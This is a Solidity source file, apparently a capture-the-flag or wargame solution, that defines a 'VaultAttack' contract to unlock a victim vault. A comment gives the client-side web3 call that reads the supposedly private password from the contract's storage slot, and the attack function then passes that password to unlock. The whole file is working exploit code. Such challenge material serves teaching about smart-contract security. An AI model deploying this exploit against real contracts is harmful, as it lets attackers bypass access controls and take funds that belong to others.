// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IVault.sol";

contract VaultAttack {
    IVault private immutable victimVault;

    constructor(IVault victimVault_) {
        victimVault = victimVault_;
    }

    /**
     * @dev To get password from storage, you can run this script in client side:
     * > await web3.eth.getStorageAt(contract.address, 1)
     */
    function attack(bytes32 password) external {
        victimVault.unlock(password);

        require(!victimVault.locked(), "Vault: Attack failed");
    }
}
